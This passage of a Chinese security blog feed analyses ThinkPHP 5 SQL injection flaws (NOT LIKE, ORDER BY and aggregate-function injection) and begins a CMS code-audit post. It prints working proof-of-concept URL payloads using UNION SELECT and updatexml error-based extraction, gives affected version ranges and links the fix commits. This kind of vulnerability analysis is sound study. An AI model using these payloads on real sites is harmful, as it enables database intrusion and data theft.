‘%王%’</p></blockquote><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该SQL注入漏洞影响版本为 <code>5.0.10</code> ，因此去 <code>5.0.11</code> 的更新记录中，则可以查看相关的修复操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ：<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>（ 急需如何快速定位到 某个指定的commit 记录的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>可以看到，这里之前是没有将特殊字符 <code>NOT LIKE</code>   给过滤掉。</p><hr><p>根据Payload来分析漏洞原理：</p><blockquote><p>不管以哪种方式传递数据给服务器，这些数据在 <strong>ThinkPHP</strong> 中都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法</p></blockquote><p>在<code>input</code> 方法中：传入的数据会经过 filterValue过滤<code>和 </code>强制类型转换,然后返回。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>跟进该方法，查看是如何实现的。发现又会调用到<code>filterExp</code>  方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>可以看到没有过滤<code>NOT LIKE</code></p><blockquote><p>ThinkPHP处理 <strong>SQL</strong> 语句的方法。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>此处的<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类。而<code>Mysql</code> 类继承于 <code>Builder</code>类，所以会继续调用到<code>Builder</code>类的<code>select</code>方法。该方法调用了<code>parseWhere</code>方法，然后调用了<code>buildWhere</code>方法，该方法继续调用了 <code>parseWhereItem</code> 方法，跟进该方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>此处到 操作符 <code>$exp</code> 为 <code>NOT LIKE</code> 或 <code>LIKE</code> 时，MySQL 的逻辑控制符可控。后进行拼接返回带入SQL语句中执行，导致了SQL注入漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>最终的结果就是返回带有恶意的SQL Payload（<code>whereStr</code>，红色部分。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>整个过程的方法调用情况如绿色框起的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-3"><a href="#利用总结-3" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>下图来自七月火师傅的总结文章里的。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>增加过滤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQL注入五-order-by"><a href="#SQL注入五-order-by" class="headerlink" title="SQL注入五(order by)"></a>SQL注入五(order by)</h1><p>环境搭建也差不多，需要手动开启<code>../config/app.php</code> 下的<code>app_debug</code> 和 <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <code>Builder</code> 类的 <code>parseOrder</code> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。</p><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>从修改记录中看到，增加了一条if判断语句来过滤<code>$key</code>中的<code>)</code> 和 <code>#</code>  。这两个符号也是在CTF中往往会过滤的点。</p><p>我们的数据都会进入到<code>Request</code> 类中的<code>input</code>方法，并且经过<code>filterValue</code>方法的过滤和强制类型转换并返回<code>$data</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>这里<code>array_walk_recursive()</code>函数，对数组中的成员递归调用<code>filterValue</code> 过滤函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>但是<code>filterValue</code> 过滤函数，不过滤数组的<code>key</code> ， 只过滤了数组的<code>value</code> 。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>用户输入的数据会原样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>进入框架的 SQL查询方法中，进入<code>Query</code>类，这次是通过调用<code>order</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>恶意Payload 未经过任何过滤直接传递给<code>options[&#39;order&#39;]</code> 中。接着调用<code>find()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>此处<code>$this-&gt;connection</code> 是<code>think/db/connectior/Mysql</code>类 ，继承于<code>Connection</code>类，于是此处继续调用该类的<code>find()</code>方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>该方法继续调用了 <code>$this-&gt;builder</code>, 即<code>think/db/builder/Mysql</code> 类的<code>select</code> 方法。该方法通过<code>str_replace</code> 函数，将数据填充到SQL语句中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用了<code>parseOrder</code> 方法，跟进下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的函数中，<code>$order</code> 即是我们输入的数据，然后经过了<code>parseKey</code> 方法处理后返回给<code>$array</code>。</p><p>跟进查看该方法的实现。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>该方法在变量<code>$key</code> 的两端添加了反引号进行拼接，并且没有任何过滤。再和精心构造好的Payload 结合后</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>最终返回了一个带有<code>ORDER BY</code> 的 SQL 注入 payload 给要执行的SQL语句，实现<code>ORDER BY</code> 注入。</p><h2 id="利用总结-4"><a href="#利用总结-4" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQL注入六-Mysql聚合函数注入"><a href="#SQL注入六-Mysql聚合函数注入" class="headerlink" title="SQL注入六(Mysql聚合函数注入)"></a>SQL注入六(Mysql聚合函数注入)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>不同版本 <strong>payload</strong> 需稍作调整：</p><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>这里以<code>5.1.25</code> 版本的ThinkPHP 进行漏洞分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="漏洞概述-5"><a href="#漏洞概述-5" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和之前的分析思路一样，先去Github 上找更新版本的commit 记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>新增加了一条<code>if</code> 判断 语句，用来抛出异常。</p><p>和前几个ThinkPHP 5 SQL 注入漏洞一样，程序都会进入到<code>Query</code> 类中，此处在<code>../application/index/controller/index.php</code> 中，模拟的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此会先进入到<code>Query</code>类 的 <code>max</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>用户的输入传给了<code>field</code> ：id`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>然后该方法继续调用了<code>aggregate</code> 方法，该方法接着调用了<code>$this-&gt;connection</code> 的 <code>aggregate</code>方法，而<code>$this-&gt;connection</code> 为<code>think\db\connector\Mysql</code> 类，而<code>Mysql</code>类继承与<code>Connection</code> 类，故调用该类的<code>aggregate</code> 方法，该方法又调用了<code>$this-&gt;builder</code>，此处为<code>think\db\Builder\Mysql</code> 类的 <code>parseKey</code> 方法。该方法和SQL注入五起到的作用一样。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>理清了调用情况。具体说<code>parseKey</code>方法的作用</p><blockquote><p><strong>parseKey</strong> 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 <strong>parseKey</strong> 方法处理后，程序又回到了上图的 <strong>$this-&gt;value()</strong> 方法中，该方法会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来构造 <strong>SQL</strong> 语句。这个方法应该说是在分析 <strong>ThinkPHP</strong> 漏洞时，非常常见的了。其无非就是使用 <strong>str_replace</strong> 方法，将变量替换到 <strong>SQL</strong> 语句模板中。这里，我们重点关注 <strong>parseField</strong> 方法，因为用户可控数据存储在 <strong>$options[‘field’]</strong> 变量中并被传入该方法。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>parseFieid</code>方法，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// 支持 &#x27;field1&#x27;=&gt;&#x27;field2&#x27; 这样的字段别名定义</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法未做任何过滤，用户可控数据只是经过 <strong>parseKey</strong> 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong> 语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生</p><h2 id="利用总结-5"><a href="#利用总结-5" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境准备：&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>新秀企业网站系统代码审计学习(复现)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>参考资料：</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">代码审计常见的三种方法（PHP篇）</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHP代码审计初次尝试之新秀企业网站系统</a></p><p>审计思路通过脑图大概总结如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="了解系统"><a href="#了解系统" class="headerlink" title="了解系统"></a>了解系统</h1><p><strong>CMS名称</strong>：新秀企业网站系统PHP版</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>看着界面就知道是用于企业打广告(x)和发布信息，招聘等功能的系统。且存在前台用户登录和后台管理系统。存在搜索功能。</p><h1 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h1><h2 id="IP登录限制-猜测伪造IP注入"><a href="#IP登录限制-猜测伪造IP注入" class="headerlink" title="IP登录限制 - 猜测伪造IP注入"></a>IP登录限制 - 猜测伪造IP注入</h2><p>限制了前台、后台的登录次数限制、注册限制、可能会影响到后面SQL注入漏洞的测试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>可能出现的漏洞：<strong>伪造IP进行注入攻击</strong></p><p>数据库监控，在注册的地方看看<code>ip</code> 是否被带入了数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; 